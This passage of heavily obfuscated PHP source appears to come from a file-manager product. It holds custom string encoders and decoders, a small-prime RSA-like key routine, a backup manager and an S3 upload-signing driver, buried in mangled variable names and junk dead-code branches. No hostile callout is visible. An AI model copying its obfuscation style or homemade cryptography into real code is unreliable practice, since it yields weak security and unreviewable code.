$éËßõŸ[691]; switch ($¶Æ…€ş”) { case $ßÈé¤Ëô[199]: $–é½ù = $this->tmle2dcd9237($òµ¦ó§—, strrev($ıèÉ€Å® . $­Êåµó )); break; $«·™æ·  = $éËßõŸ[692]; if (!$«·™æ· ) { return; } case $ßÈé¤Ëô[191]: $–é½ù = $this->tmle2dcd9237($òµ¦ó§—, strrev($­Êåµó  . $ıèÉ€Å®)); break; case $ßÈé¤Ëô[293]: $–é½ù = $this->tmle2dcd9237($òµ¦ó§—, base64_encode($­Êåµó  . $ıèÉ€Å®)); $ûÒé¥öä = $éËßõŸ[693]; break; case $ßÈé¤Ëô[294]: $–é½ù = $this->tmle2dcd9237($òµ¦ó§—, md5($­Êåµó  . $ıèÉ€Å®)); $ëŸÎ’û… = $éËßõŸ[694]; if (strlen($ëŸÎ’û…) < $éËßõŸ[12]) { return; } break; $‡úú¡ƒ› = $éËßõŸ[695]; if (!$‡úú¡ƒ›) { die; } case $ßÈé¤Ëô[295]: $òµ¦ó§— = base64_encode($òµ¦ó§—); $¢¾¸¶ÔÃ = $éËßõŸ[696]; $üÉµ‰½‘ = rand(0, 64); $«­˜€ã = $éËßõŸ[697]; $Äá·ê˜ó = $ÁÛ¼Ş£³[$üÉµ‰½‘]; $ÇÔ¡¿„Ó = $éËßõŸ[698]; while ($ÇÔ¡¿„Ó < $éËßõŸ[607]) { if ($ÇÔ¡¿„Ó >= 0) { break; } $ÇÔ¡¿„Ó++; } $•Ó¶¼şç = md5($Äá·ê˜ó . md5($ıèÉ€Å® . $Äá·ê˜ó) . $ıèÉ€Å®); $õã´Ô = $éËßõŸ[699]; while ($õã´Ô < $éËßõŸ[607]) { if ($õã´Ô >= 0) { break; } $õã´Ô++; } $•Ó¶¼şç = substr($•Ó¶¼şç, $üÉµ‰½‘ % 8, $üÉµ‰½‘ % 8 + 7); $õË ¼í = $ßÈé¤Ëô[6]; $šâ·éŞõ = $éËßõŸ[700]; if (strlen($šâ·éŞõ) < $éËßõŸ[618]) { die; } $’›£ƒ‘Â = 0; $È‹Æë«› = $éËßõŸ[701]; if (!$È‹Æë«›) { die; } $Õí‘×Ô = 0; $£ö™Õüƒ = 0; $ÅÖıÂÌ = $éËßõŸ[702]; for ($’›£ƒ‘Â = 0; $’›£ƒ‘Â < strlen($òµ¦ó§—); $’›£ƒ‘Â++) { $£ö™Õüƒ = $£ö™Õüƒ == strlen($•Ó¶¼şç) ? 0 : $£ö™Õüƒ; $Õí‘×Ô = ($üÉµ‰½‘ + strpos($ÁÛ¼Ş£³, $òµ¦ó§—[$’›£ƒ‘Â]) + ord($•Ó¶¼şç[$£ö™Õüƒ++])) % 64; $é±Îâ¼á = $éËßõŸ[703]; if (strlen($é±Îâ¼á) < $éËßõŸ[618]) { die; } $õË ¼í .= $ÁÛ¼Ş£³[$Õí‘×Ô]; } $–é½ù = hash_encode($Äá·ê˜ó . $õË ¼í); break; default: $–é½ù = $this->tmle2dcd9237($òµ¦ó§—, $ıèÉ€Å® . $­Êåµó ); $çù£éá‘ = $éËßõŸ[704]; break; } $–é½ù = strrev($¶Æ…€ş” . $­Êåµó  . $–é½ù); $òæÎš¼Ò = $éËßõŸ[705]; if (strlen($òæÎš¼Ò) < $éËßõŸ[618]) { return; } if ($üõû‰ôĞ - 1 > 0) { $–é½ù = $this->iwajbcfbcb7f($–é½ù, $ıèÉ€Å®, $üõû‰ôĞ - 1); } return $–é½ù; } private function zyga1fd45fad($ÊöØõÕ±, $ÈÓˆ³Åµ, $Êã½€Öş = 3) { $¼£®ÚŠ¶ =& $_SERVER[¹àö™Ç¾]; $Ğ’š’›ş =& $_SERVER[˜²›ÃôÇ]; if (!is_string($ÊöØõÕ±) || strlen($ÊöØõÕ±) < 10) { return !1; } $ÊöØõÕ± = trim($ÊöØõÕ±); $ÊöØõÕ± = strrev($ÊöØõÕ±); $çõöÜï = $ÊöØõÕ±[0]; $Ø¾Ï¿Õ = $¼£®ÚŠ¶[706]; $Šæ§Çä® = substr($ÊöØõÕ±, 1, 15); $ÊöØõÕ± = substr($ÊöØõÕ±, 16); $”‘Ä“Ç– = $Ğ’š’›ş[292]; switch ($çõöÜï) { case $Ğ’š’›ş[199]: $Š“£Ö¿ = $this->wruqc0243417($ÊöØõÕ±, strrev($ÈÓˆ³Åµ . $Šæ§Çä®)); break; $©´‰É„— = $¼£®ÚŠ¶[699]; if (!$©´‰É„—) { return; } case $Ğ’š’›ş[191]: $Š“£Ö¿ = $this->wruqc0243417($ÊöØõÕ±, strrev($Šæ§Çä® . $ÈÓˆ³Åµ)); break; $ÔåÑ£€È = $¼£®ÚŠ¶[707]; case $Ğ’š’›ş[293]: $Š“£Ö¿ = $this->wruqc0243417($ÊöØõÕ±, base64_encode($Šæ§Çä® . $ÈÓˆ³Åµ)); $îùÓÅáü = $¼£®ÚŠ¶[708]; if (strlen($îùÓÅáü) < $¼£®ÚŠ¶[611]) { return; } break; case $Ğ’š’›ş[294]: $Š“£Ö¿ = $this->wruqc0243417($ÊöØõÕ±, md5($Šæ§Çä® . $ÈÓˆ³Åµ)); $¤Ñ•‡¯Ş = $¼£®ÚŠ¶[709]; if (strlen($¤Ñ•‡¯Ş) < $¼£®ÚŠ¶[12]) { die; } break; case $Ğ’š’›ş[295]: $ÊöØõÕ± = hash_decode($ÊöØõÕ±); $ğ´ˆ¯ó = $¼£®ÚŠ¶[710]; $ü·ˆµÏË = $ÊöØõÕ±[0]; $ÊöØõÕ± = substr($ÊöØõÕ±, 1); $âß´Ïò = strpos($”‘Ä“Ç–, $ü·ˆµÏË); $¨è¤ÊŸ¿ = md5($ü·ˆµÏË . md5($ÈÓˆ³Åµ . $ü·ˆµÏË) . $ÈÓˆ³Åµ); $¨è¤ÊŸ¿ = substr($¨è¤ÊŸ¿, $âß´Ïò % 8, $âß´Ïò % 8 + 7); $³äòÌ›† = $Ğ’š’›ş[6]; $õÍ†¡æ‡ = $¼£®ÚŠ¶[711]; $ŒöÍÆ‚ñ = 0; $ÚÏ‚öŸÛ = $¼£®ÚŠ¶[712]; $˜¦¼«‘û = 0; $Ì÷­ÉôÖ = $¼£®ÚŠ¶[713]; $¨øÆ˜ = 0; for ($ŒöÍÆ‚ñ = 0; $ŒöÍÆ‚ñ < strlen($ÊöØõÕ±); $ŒöÍÆ‚ñ++) { $¨øÆ˜ = $¨øÆ˜ == strlen($¨è¤ÊŸ¿) ? 0 : $¨øÆ˜; $Ñè«ÃÓ€ = $¼£®ÚŠ¶[714]; if (strlen($Ñè«ÃÓ€) < $¼£®ÚŠ¶[12]) { die; } $ô—ô„§Î = $¨øÆ˜++; $˜¦¼«‘û = strpos($”‘Ä“Ç–, $ÊöØõÕ±[$ŒöÍÆ‚ñ]) - $âß´Ïò - ord($¨è¤ÊŸ¿[$ô—ô„§Î]); while ($˜¦¼«‘û < 0) { $˜¦¼«‘û += 64; $Ç—¬ƒæÎ = $¼£®ÚŠ¶[715]; while (strlen($Ç—¬ƒæÎ) < $¼£®ÚŠ¶[607]) { if (!$Ç—¬ƒæÎ) { break; } $Ç—¬ƒæÎ++; } } $³äòÌ›† .= $”‘Ä“Ç–[$˜¦¼«‘û]; $ğùŠß‹ = $¼£®ÚŠ¶[716]; while (strlen($ğùŠß‹) < $¼£®ÚŠ¶[629]) { if (!$ğùŠß‹) { break; } $ğùŠß‹++; } } $Š“£Ö¿ = base64_decode($³äòÌ›†); $ÜÏ²¸¡£ = $¼£®ÚŠ¶[717]; while ($ÜÏ²¸¡£ < $¼£®ÚŠ¶[607]) { if ($ÜÏ²¸¡£ >= 0) { break; } $ÜÏ²¸¡£++; } break; default: $Š“£Ö¿ = $this->wruqc0243417($ÊöØõÕ±, $ÈÓˆ³Åµ . $Šæ§Çä®); break; } if ($Êã½€Öş - 1 > 0) { $Š“£Ö¿ = $this->zyga1fd45fad($Š“£Ö¿, $ÈÓˆ³Åµ, $Êã½€Öş - 1); } return $Š“£Ö¿; } public function fzgl98db955c($Û¥¯Ú) { $ÅÄ¾ò£Ÿ =& $_SERVER[¹àö™Ç¾]; $äÕ×ú =& $_SERVER[˜²›ÃôÇ]; $›¾Ô¶€ = $this->wrkvacdd8d5a(); $š¬•ÌéÍ = $ÅÄ¾ò£Ÿ[718]; if (strlen($š¬•ÌéÍ) < $ÅÄ¾ò£Ÿ[607]) { return; } $ÁÛ‡ìÀ• = $this->wrkvacdd8d5a(); $Åæéòâ = $ÅÄ¾ò£Ÿ[719]; while ($Åæéòâ < $ÅÄ¾ò£Ÿ[629]) { if ($Åæéòâ >= 0) { break; } $Åæéòâ++; } $¾ò²ßí¨ = ($›¾Ô¶€ - 1) * ($ÁÛ‡ìÀ• - 1); $´š«ÙıØ = intval(($›¾Ô¶€ + $ÁÛ‡ìÀ•) / 2); while (1) { $ô¢Èè” = $´š«ÙıØ; $¡ƒÂÎ¬í = $ÅÄ¾ò£Ÿ[720]; while (strlen($¡ƒÂÎ¬í) < $ÅÄ¾ò£Ÿ[12]) { if (!$¡ƒÂÎ¬í) { break; } $¡ƒÂÎ¬í++; } $­×è˜é  = $¾ò²ßí¨; $¼³…§’å = $ÅÄ¾ò£Ÿ[721]; while ($¼³…§’å < $ÅÄ¾ò£Ÿ[618]) { if ($¼³…§’å >= 0) { break; } $¼³…§’å++; } while ($­×è˜é  % $ô¢Èè” != 0) { $×»šÈŞ½ = $­×è˜é ; $­×è˜é  = $ô¢Èè”; $ô¢Èè” = $×»šÈŞ½ % $ô¢Èè”; $Éáüâ± = $ÅÄ¾ò£Ÿ[722]; if (!$Éáüâ±) { die; } } if ($ô¢Èè” == 1) { break; } else { $´š«ÙıØ++; } } $Ğ‰Î÷æ = 2; $Ãø÷“¡ò = $ÅÄ¾ò£Ÿ[723]; while (strlen($Ãø÷“¡ò) < $ÅÄ¾ò£Ÿ[618]) { if (!$Ãø÷“¡ò) { break; } $Ãø÷“¡ò++; } for ($Ãü×ŞÃ = 0; $Ãü×ŞÃ < $¾ò²ßí¨ * 10; $Ãü×ŞÃ++) { if (($¾ò²ßí¨ * $Ãü×ŞÃ + 1) % $´š«ÙıØ == 0) { $Ğ‰Î÷æ = intval(($¾ò²ßí¨ * $Ãü×ŞÃ + 1) / $´š«ÙıØ); break; } } $åóÕõù× = $this->tmle2dcd9237($›¾Ô¶€ * $ÁÛ‡ìÀ• . $äÕ×ú[6], $äÕ×ú[130]); $¨ôŸ– = md5($äÕ×ú[296] . ($›¾Ô¶€ + $ÁÛ‡ìÀ•) . $äÕ×ú[297] . $´š«ÙıØ . $äÕ×ú[297] . $Ğ‰Î÷æ . $äÕ×ú[298]); $•«Ç«Ÿ  = $this->tmle2dcd9237($Û¥¯Ú, $¨ôŸ–) . $äÕ×ú[299] . $åóÕõù×; return $•«Ç«Ÿ ; $³Ğİ›í× = $ÅÄ¾ò£Ÿ[724]; if (strlen($³Ğİ›í×) < $ÅÄ¾ò£Ÿ[629]) { die; } } public function tglb80b505ca($òéã„à¯) { $ÑØªêßÔ =& $_SERVER[¹àö™Ç¾]; $ãªÍ›Ü =& $_SERVER[˜²›ÃôÇ]; $úÖÅßÙê = explode($ãªÍ›Ü[299], $òéã„à¯); $Ş¯Ã‘¬ó = $ÑØªêßÔ[725]; while (strlen($Ş¯Ã‘¬ó) < $ÑØªêßÔ[607]) { if (!$Ş¯Ã‘¬ó) { break; } $Ş¯Ã‘¬ó++; } if (count($úÖÅßÙê) != 2) { return $ãªÍ›Ü[6]; } $ˆÏÛ½—± = $this->wruqc0243417($úÖÅßÙê[1] . $ãªÍ›Ü[6], $ãªÍ›Ü[130]); $ç­†ÅË = $ÑØªêßÔ[726]; if (!$ç­†ÅË) { return; } if (!$ˆÏÛ½—±) { return $ãªÍ›Ü[6]; } $ˆÏÛ½—± = intval($ˆÏÛ½—±); $Àù¢ß™Ô = $ÑØªêßÔ[727]; $ùŒĞÖ×Ï = 0; $ãú­´ñ = 0; for ($ªç‰ É = 3; $ªç‰ É < $ˆÏÛ½—±; $ªç‰ É += 2) { if ($ˆÏÛ½—± % $ªç‰ É != 0) { continue; } $ùŒĞÖ×Ï = $ªç‰ É; $ãú­´ñ = intval($ˆÏÛ½—± / $ªç‰ É); break; } $Â€òŸ¶— = ($ùŒĞÖ×Ï - 1) * ($ãú­´ñ - 1); $áü¿ºÉ¹ = $ÑØªêßÔ[728]; if (strlen($áü¿ºÉ¹) < $ÑØªêßÔ[618]) { return; } $Ÿ½˜¼í“ = intval(($ùŒĞÖ×Ï + $ãú­´ñ) / 2); while (1) { $Áç‰… = $Ÿ½˜¼í“; $©Ş¸•×ƒ = $Â€òŸ¶—; while ($©Ş¸•×ƒ % $Áç‰… != 0) { $³•óÖĞ÷ = $©Ş¸•×ƒ; $©Ş¸•×ƒ = $Áç‰…; $Áç‰… = $³•óÖĞ÷ % $Áç‰…; } if ($Áç‰… == 1) { break; } else { $Ÿ½˜¼í“++; } } $šõ®Óõî = 2; for ($ªç‰ É = 0; $ªç‰ É < $Â€òŸ¶— * 10; $ªç‰ É++) { if (($Â€òŸ¶— * $ªç‰ É + 1) % $Ÿ½˜¼í“ == 0) { $šõ®Óõî = intval(($Â€òŸ¶— * $ªç‰ É + 1) / $Ÿ½˜¼í“); break; } } $ü”¬‘©ş = md5($ãªÍ›Ü[296] . ($ùŒĞÖ×Ï + $ãú­´ñ) . $ãªÍ›Ü[297] . $Ÿ½˜¼í“ . $ãªÍ›Ü[297] . $šõ®Óõî . $ãªÍ›Ü[298]); $„Àíš²‹ = $ÑØªêßÔ[729]; while ($„Àíš²‹ < $ÑØªêßÔ[607]) { if ($„Àíš²‹ >= 0) { break; } $„Àíš²‹++; } $ğçëÄ™ƒ = $this->wruqc0243417($úÖÅßÙê[0], $ü”¬‘©ş); $¦ÌòÓ¢¸ = $ÑØªêßÔ[730]; if (strlen($¦ÌòÓ¢¸) < $ÑØªêßÔ[607]) { return; } return $ğçëÄ™ƒ; } public function wrkvacdd8d5a() { $¥“êÛ =& $_SERVER[¹àö™Ç¾]; $‡¯ïŒ¶ = mt_rand(pow(2, 14), pow(2, 16) - 1); $²şä°ü = $¥“êÛ[731]; $™£®çÏ = array(); $‰±™®”ş = $¥“êÛ[732]; while (strlen($‰±™®”ş) < $¥“êÛ[607]) { if (!$‰±™®”ş) { break; } $‰±™®”ş++; } $ÀÉ×¤Ë = 1; while ($ÀÉ×¤Ë <= (int) sqrt($‡¯ïŒ¶)) { $’î¾¿õ· = $ÀÉ×¤Ë; $ß”Æºú = $¥“êÛ[733]; if (strlen($ß”Æºú) < $¥“êÛ[607]) { return; } while (!0) { $’î¾¿õ·++; if ($’î¾¿õ· <= 2) { $ÀÉ×¤Ë = $’î¾¿õ·; break; } else { if ($’î¾¿õ· < 2) { continue; } } $Ìºü–™ = !0; for ($íï¾ÜŒ÷ = 2; $íï¾ÜŒ÷ <= sqrt($’î¾¿õ·); $íï¾ÜŒ÷++) { if ($’î¾¿õ· % $íï¾ÜŒ÷ == 0) { $Ìºü–™ = !1; } } if ($Ìºü–™) { $ÀÉ×¤Ë = $’î¾¿õ·; break; } } $™£®çÏ[] = $ÀÉ×¤Ë; $…£Üõ¬º = $¥“êÛ[734]; if (strlen($…£Üõ¬º) < $¥“êÛ[618]) { die; } } $ôéÜÃÄ¼ = 2; $Ñªß¨é¹ = $¥“êÛ[735]; for ($’î¾¿õ· = $‡¯ïŒ¶; $’î¾¿õ· > 1; $’î¾¿õ·--) { $Ìºü–™ = !0; $¯îµíæÙ = $¥“êÛ[736]; foreach ($™£®çÏ as $ü×ºôîü) { if ($’î¾¿õ· % $ü×ºôîü == 0) { $Ìºü–™ = !1; break; } } if ($Ìºü–™) { $ôéÜÃÄ¼ = $’î¾¿õ·; break; } } return $ôéÜÃÄ¼; } public function qpibd49f4592($”Ï§ÜÒ, $—ıÊ«ÇŠ) { $ÆÁÕ‡ =& $_SERVER[˜²›ÃôÇ]; return call_user_func(array($ÆÁÕ‡[8], $ÆÁÕ‡[300]), $”Ï§ÜÒ, $—ıÊ«ÇŠ); $¥™…“¾ = $_SERVER[¹àö™Ç¾][737]; if (!$¥™…“¾) { return; } } public function tmle2dcd9237($ÜøÎşÛğ, $¾²šâ) { $±ıä±Ù =& $_SERVER[˜²›ÃôÇ]; return call_user_func(array($±ıä±Ù[301], $±ıä±Ù[302]), $ÜøÎşÛğ, $¾²šâ); $»÷°÷” = $_SERVER[¹àö™Ç¾][738]; } public function wruqc0243417($É­’”†, $©¶¹—ù) { $çìçÑú =& $_SERVER[˜²›ÃôÇ]; return call_user_func(array($çìçÑú[301], $çìçÑú[303]), $É­’”†, $©¶¹—ù); $‰èıÉü× = $_SERVER[¹àö™Ç¾][739]; if (!$‰èıÉü×) { return; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $®üêñü… =& $_SERVER[¹àö™Ç¾]; $this->isManual(); self::$name = date($®üêñü…[740]); if (!($ç„³—ÖÎ = Model($®üêñü…[741])->lastItem())) { $ç„³—ÖÎ = $this->initData(); } else { self::$name = $ç„³—ÖÎ[$®üêñü…[42]]; if ($ç„³—ÖÎ[$®üêñü…[742]] == $®üêñü…[99]) { self::$name = date($®üêñü…[743]); $ö¦¨–á = 0; if (isset($ç„³—ÖÎ[$®üêñü…[297]][$®üêñü…[202]][$®üêñü…[467]])) { $ö¦¨–á = (int) $ç„³—ÖÎ[$®üêñü…[297]][$®üêñü…[202]][$®üêñü…[467]]; } if (self::$manual == 0 && $ç„³—ÖÎ[$®üêñü…[42]] == self::$name) { Model($®üêñü…[741])->remove($ç„³—ÖÎ[$®üêñü…[401]]); } $ç„³—ÖÎ = $this->initData($ö¦¨–á, $ç„³—ÖÎ[$®üêñü…[744]]); } else { $this->checkStore($ç„³—ÖÎ[$®üêñü…[744]]); } } self::$option = $ç„³—ÖÎ; } private function isManual() { $à²ÊÀ¨½ = _get($GLOBALS, $_SERVER[¹àö™Ç¾][745], 0); $à²ÊÀ¨½ = intval($à²ÊÀ¨½); self::$manual = $à²ÊÀ¨½ && $à²ÊÀ¨½ == 1 ? 1 : 0; } private function initData($šŞ©‹€° = 0, $¹…¯£„ = '') { $€¢²Ö˜¯ =& $_SERVER[¹àö™Ç¾]; $¿¯•£á« = Model($€¢²Ö˜¯[741])->config(); if ($¹…¯£„ && $¿¯•£á«[$€¢²Ö˜¯[744]] != $¹…¯£„) { $šŞ©‹€° = 0; } $this->checkStore($¿¯•£á«[$€¢²Ö˜¯[744]]); if (self::$manual == 1) { self::$name .= $€¢²Ö˜¯[21] . date($€¢²Ö˜¯[746]); } $Èôúà¨İ = array($€¢²Ö˜¯[744] => $¿¯•£á«[$€¢²Ö˜¯[744]], $€¢²Ö˜¯[42] => self::$name, $€¢²Ö˜¯[742] => 0, $€¢²Ö˜¯[747] => $¿¯•£á«[$€¢²Ö˜¯[747]], $€¢²Ö˜¯[748] => self::$manual, $€¢²Ö˜¯[297] => array($€¢²Ö˜¯[749] => array($€¢²Ö˜¯[742] => 0), $€¢²Ö˜¯[750] => array($€¢²Ö˜¯[742] => 0, $€¢²Ö˜¯[751] => 0, $€¢²Ö˜¯[752] => 0, $€¢²Ö˜¯[43] => $€¢²Ö˜¯[22], $€¢²Ö˜¯[753] => 0, $€¢²Ö˜¯[496] => 0), $€¢²Ö˜¯[754] => array($€¢²Ö˜¯[742] => 0, $€¢²Ö˜¯[751] => 0, $€¢²Ö˜¯[752] => 0, $€¢²Ö˜¯[753] => 0, $€¢²Ö˜¯[496] => 0), $€¢²Ö˜¯[202] => array($€¢²Ö˜¯[742] => 0, $€¢²Ö˜¯[755] => 0, $€¢²Ö˜¯[756] => 0, $€¢²Ö˜¯[757] => 0, $€¢²Ö˜¯[758] => 0, $€¢²Ö˜¯[467] => $šŞ©‹€°, $€¢²Ö˜¯[753] => 0, $€¢²Ö˜¯[496] => 0)), $€¢²Ö˜¯[753] => time(), $€¢²Ö˜¯[496] => 0); $Ş¨¯úÕ = Model($€¢²Ö˜¯[741])->insert($Èôúà¨İ); $Èôúà¨İ[$€¢²Ö˜¯[401]] = $Ş¨¯úÕ; return $Èôúà¨İ; } private function checkStore($îæ®ˆÅÉ) { $²ñó…¥ =& $_SERVER[¹àö™Ç¾]; $ºñÖ¯Şë = Model($²ñó…¥[759])->listData($îæ®ˆÅÉ); Model($²ñó…¥[759])->checkConfig($ºñÖ¯Şë); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¹àö™Ç¾][741])->findByName(self::$name); } return self::$option; } public static function set($¹º…ñï¦) { $ˆÃ¯ï´ø =& $_SERVER[¹àö™Ç¾]; $…£¸²ğ¸ = self::get(); foreach ($¹º…ñï¦ as $³®üøšÂ => $§Ü­Ì¯Ä) { $ëŒô¹ ‘ = explode($ˆÃ¯ï´ø[20], $³®üøšÂ); $ÅİíËƒû = count($ëŒô¹ ‘); switch ($ÅİíËƒû) { case 1: $…£¸²ğ¸[$ëŒô¹ ‘[0]] = $§Ü­Ì¯Ä; break; case 2: $…£¸²ğ¸[$ëŒô¹ ‘[0]][$ëŒô¹ ‘[1]] = $§Ü­Ì¯Ä; break; case 3: $…£¸²ğ¸[$ëŒô¹ ‘[0]][$ëŒô¹ ‘[1]][$ëŒô¹ ‘[2]] = $§Ü­Ì¯Ä; break; } } Model($ˆÃ¯ï´ø[741])->update($…£¸²ğ¸[$ˆÃ¯ï´ø[401]], $…£¸²ğ¸); self::$option = $…£¸²ğ¸; return self::$option; } public function keep() { $åÏ”Å£‰ =& $_SERVER[¹àö™Ç¾]; $à…îíˆÃ = self::get(); if ($à…îíˆÃ[$åÏ”Å£‰[297]][$åÏ”Å£‰[749]][$åÏ”Å£‰[742]] == $åÏ”Å£‰[99]) { return; } $this->backupKeep($à…îíˆÃ); self::set(array($åÏ”Å£‰[760] => 1)); } private function backupKeep($Ò‡Ó²Âç) { $Ô’Ğş =& $_SERVER[¹àö™Ç¾]; if (self::$manual == 1) { return; } $âµÑÏ‘Ò = Model($Ô’Ğş[741])->listData(); if (empty($âµÑÏ‘Ò)) { return; } $ß¹ĞŸÊª = 0; $òü²ë´ = array(); foreach ($âµÑÏ‘Ò as $ÓğÓÛµ²) { if ($ß¹ĞŸÊª >= 7) { break; } $òü²ë´[] = $ÓğÓÛµ²[$Ô’Ğş[42]]; $ß¹ĞŸÊª++; } for ($ß¹ĞŸÊª = 0; $ß¹ĞŸÊª < 12; $ß¹ĞŸÊª++) { $òü²ë´[] = date($Ô’Ğş[761], strtotime("\x2d{$ß¹ĞŸÊª}\40\x6d\x6f\156\x74\x68\163")); } $òü²ë´ = array_unique($òü²ë´); $¸ğŸ•ìä = Model($Ô’Ğş[762])->get($Ô’Ğş[763]); foreach ($âµÑÏ‘Ò as $ÓğÓÛµ²) { if (isset($ÓğÓÛµ²[$Ô’Ğş[748]]) && $ÓğÓÛµ²[$Ô’Ğş[748]] == $Ô’Ğş[99]) { continue; } if (!empty($ÓğÓÛµ²[$Ô’Ğş[42]]) && in_array($ÓğÓÛµ²[$Ô’Ğş[42]], $òü²ë´)) { continue; } Model($Ô’Ğş[741])->remove($ÓğÓÛµ²[$Ô’Ğş[401]]); $¢ÅÅÖ¹ = $this->backupPath($Ò‡Ó²Âç, $¸ğŸ•ìä); IO::remove($¢ÅÅÖ¹, !1); } } private function backupPath($´‰ÂÉï, $Â¦ã›ñÂ = false) { $¢²Ú“—º =& $_SERVER[¹àö™Ç¾]; if (!$Â¦ã›ñÂ) { $Â¦ã›ñÂ = Model($¢²Ú“—º[762])->get($¢²Ú“—º[763]); } $éÕÁşıœ = $´‰ÂÉï[$¢²Ú“—º[42]]; $ÕÁü¯Ùú = substr(md5($¢²Ú“—º[764] . $Â¦ã›ñÂ . $éÕÁşıœ), 0, 8); return "\x7b\151\157\72{$´‰ÂÉï[$¢²Ú“—º[744]]}\175\57\144\x61\x74\x61\142\141\x73\x65\57\x62\x61\143\x6b\x75\160\x2f" . $éÕÁşıœ . $¢²Ú“—º[21] . $ÕÁü¯Ùú; } public function db() { $½îÑš»µ =& $_SERVER[¹àö™Ç¾]; $ÕËéë£Á = self::get(); if ($ÕËéë£Á[$½îÑš»µ[297]][$½îÑš»µ[750]][$½îÑš»µ[742]] == $½îÑš»µ[99]) { return !0; } $ñ†µëº = new BackupDb(); if (!$ñ†µëº->index()) { return !1; } self::set(array($½îÑš»µ[765] => 1)); return !0; } public function dbFile() { $›şÌ©Ó™ =& $_SERVER[¹àö™Ç¾]; $‘ËÈÏ§§ = self::get(); if ($‘ËÈÏ§§[$›şÌ©Ó™[297]][$›şÌ©Ó™[754]][$›şÌ©Ó™[742]] == $›şÌ©Ó™[99]) { return !0; } $ƒ¯Ö²ó = new BackupDbFile(); if (!$ƒ¯Ö²ó->index()) { return !1; } self::set(array($›şÌ©Ó™[766] => 1)); return !0; } public function file() { $ Úì€Í =& $_SERVER[¹àö™Ç¾]; $ƒ‰Åçº‡ = self::get(); if ($ƒ‰Åçº‡[$ Úì€Í[297]][$ Úì€Í[202]][$ Úì€Í[742]] == $ Úì€Í[99]) { return !0; } if (!isset($ƒ‰Åçº‡[$ Úì€Í[747]]) || $ƒ‰Åçº‡[$ Úì€Í[747]] == $ Úì€Í[200]) { $ú±¯‚ = new BackupFile(); if (!$ú±¯‚->index()) { return !1; } } self::set(array($ Úì€Í[767] => 1, $ Úì€Í[742] => 1)); return !0; } } goto A„µ¸ßØØ¾; D‰áª”Ç¹: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Êã©ÑŸ¡) { parent::__construct($Êã©ÑŸ¡); } public function uploadFormData($úõñ“Î, $ÄŒúÄË¥ = 3600) { $ô”×˜şŸ =& $_SERVER[¹àö™Ç¾]; $¬«ñ¾£ = $ô”×˜şŸ[201]; $•‹‰ò•° = $ô”×˜şŸ[1329]; $Û‰½İåƒ = $ô”×˜şŸ[72]; $«™…³Ñ = gmdate($ô”×˜şŸ[1330]); $À‡¨äÒ“ = gmdate($ô”×˜şŸ[743]); $¨¦ŠáŸ­ = $ô”×˜şŸ[1331]; $Ô¥¾”• = $ÄŒúÄË¥ . $ô”×˜şŸ[22]; $œÄÈËš  = $ô”×˜şŸ[1293]; $Å´ ïœŒ = array($this->accessKey, $À‡¨äÒ“, $this->region, $Û‰½İåƒ, $¨¦ŠáŸ­); $ƒ²ˆšßı = implode($ô”×˜şŸ[18], $Å´ ïœŒ); $­ÔØ‹ = array($ô”×˜şŸ[1295] => gmdate($ô”×˜şŸ[1294], strtotime($ô”×˜şŸ[1332])), $ô”×˜şŸ[1296] => array(array($ô”×˜şŸ[1298] => $this->bucket), array($ô”×˜şŸ[1297] => $¬«ñ¾£), array($ô”×˜şŸ[1299], $ô”×˜şŸ[1300], $ô”×˜şŸ[22]), array($ô”×˜şŸ[1299], $ô”×˜şŸ[1333], $ô”×˜şŸ[22]), array($ô”×˜şŸ[1299], $ô”×˜şŸ[1334], $ô”×˜şŸ[22]), array($ô”×˜şŸ[1301] => $œÄÈËš ), array($ô”×˜şŸ[1335] => $ƒ²ˆšßı), array($ô”×˜şŸ[1336] => $•‹‰ò•°), array($ô”×˜şŸ[1337] => $«™…³Ñ), array($ô”×˜şŸ[1338] => $Ô¥¾”•))); $éÜ²Ü£± = base64_encode(json_encode($­ÔØ‹)); $ÜÉ½Ù¿¾ = hash_hmac($ô”×˜şŸ[1339], $À‡¨äÒ“, $ô”×˜şŸ[1340] . $this->secret, !0); $Øï‰†µ = hash_hmac($ô”×˜şŸ[1339], $this->region, $ÜÉ½Ù¿¾, !0); $Øë¹ïıò = hash_hmac($ô”×˜şŸ[1339], $Û‰½İåƒ, $Øï‰†µ, !0); $³™«ìûÖ = hash_hmac($ô”×˜şŸ[1339], $¨¦ŠáŸ­, $Øë¹ïıò, !0); $¤÷§¶õÍ = hash_hmac($ô”×˜şŸ[1339], $éÜ²Ü£±, $³™«ìûÖ); $´ÇØÙÕÆ = array($ô”×˜şŸ[220] => $ô”×˜şŸ[22], $ô”×˜şŸ[1341] => $ô”×˜şŸ[22], $ô”×˜şŸ[1297] => $¬«ñ¾£, $ô”×˜şŸ[1301] => $œÄÈËš , $ô”×˜şŸ[1305] => $éÜ²Ü£±, $ô”×˜şŸ[1342] => $ƒ²ˆšßı, $ô”×˜şŸ[1343] => $•‹‰ò•°, $ô”×˜şŸ[1344] => $«™…³Ñ, $ô”×˜şŸ[1345] => $Ô¥¾”•, $ô”×˜şŸ[1346] => $¤÷§¶õÍ, $ô”×˜şŸ[184] => $this->getHost()); return $´ÇØÙÕÆ; } public function multiUploadFormData($ãŸÅ©°Â, $ ü…ú«” = 3600) { $÷ÃÍÖøÔ =& $_SERVER[¹àö™Ç¾]; $µ½‹º” = gmdate($÷ÃÍÖøÔ[1425]); $â×ŞÅ×ç = array(); $âõë±ªº = $this->client->getUploadId($this->bucket, $ãŸÅ©°Â, $â×ŞÅ×ç); if (!$âõë±ªº) { return !1; } return array($÷ÃÍÖøÔ[228] => $âõë±ªº, $÷ÃÍÖøÔ[184] => $this->getHost() . $÷ÃÍÖøÔ[18] . $this->pathEncode($ãŸÅ©°Â), $÷ÃÍÖøÔ[229] => $µ½‹º”, $÷ÃÍÖøÔ[105] => $ãŸÅ©°Â); } public function multiUploadAuthData($¤î¿¶, $áÁÈ´ì = array()) { $¿öôˆëî =& $_SERVER[¹àö™Ç¾]; $Ç‡¿ËÚû = isset($áÁÈ´ì[$¿öôˆëî[177]]) ? $áÁÈ´ì[$¿öôˆëî[177]] : $¿öôˆëî[22]; $Ã‹¶Ë¸ = $áÁÈ´ì[$¿öôˆëî[105]]; unset($áÁÈ´ì[$¿öôˆëî[105]]); if (isset($áÁÈ´ì[$¿öôˆëî[230]])) { return $this->listUploadParts($Ã‹¶Ë¸, 